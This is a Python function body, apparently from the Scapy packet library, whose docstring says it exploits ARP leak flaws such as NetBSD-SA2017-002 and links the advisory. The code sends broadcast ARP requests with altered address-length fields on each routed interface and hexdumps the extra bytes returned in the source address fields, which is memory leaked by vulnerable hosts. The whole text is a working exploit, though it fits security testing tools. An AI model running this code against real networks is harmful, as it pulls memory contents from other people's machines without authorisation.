    'Exploit ARP leak flaws, like NetBSD-SA2017-002.\n\nhttps://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2017-002.txt.asc\n\n    '
    pkts_iface = {}
    for pkt in ARP(pdst=target):
        iface = conf.route.route(pkt.pdst)[0]
        psrc = get_if_addr(iface)
        hwsrc = get_if_hwaddr(iface)
        pkt.plen = plen
        pkt.hwlen = hwlen
        if plen == 4:
            pkt.psrc = psrc
        else:
            pkt.psrc = inet_aton(psrc)[:plen]
            pkt.pdst = inet_aton(pkt.pdst)[:plen]
        if hwlen == 6:
            pkt.hwsrc = hwsrc
        else:
            pkt.hwsrc = mac2str(hwsrc)[:hwlen]
        pkts_iface.setdefault(iface, []).append(Ether(src=hwsrc, dst=ETHER_BROADCAST) / pkt)
    (ans, unans) = (SndRcvList(), PacketList(name='Unanswered'))
    for (iface, pkts) in pkts_iface.items():
        (ans_new, unans_new) = srp(pkts, iface=iface, filter='arp', **kargs)
        ans += ans_new
        unans += unans_new
        ans.listname = 'Results'
        unans.listname = 'Unanswered'
    for (_, rcv) in ans:
        if ARP not in rcv:
            continue
        rcv = rcv[ARP]
        psrc = rcv.get_field('psrc').i2m(rcv, rcv.psrc)
        if plen > 4 and len(psrc) > 4:
            print('psrc')
            hexdump(psrc[4:])
            print()
        hwsrc = rcv.get_field('hwsrc').i2m(rcv, rcv.hwsrc)
        if hwlen > 6 and len(hwsrc) > 6:
            print('hwsrc')
            hexdump(hwsrc[6:])
            print()
    return (ans, unans)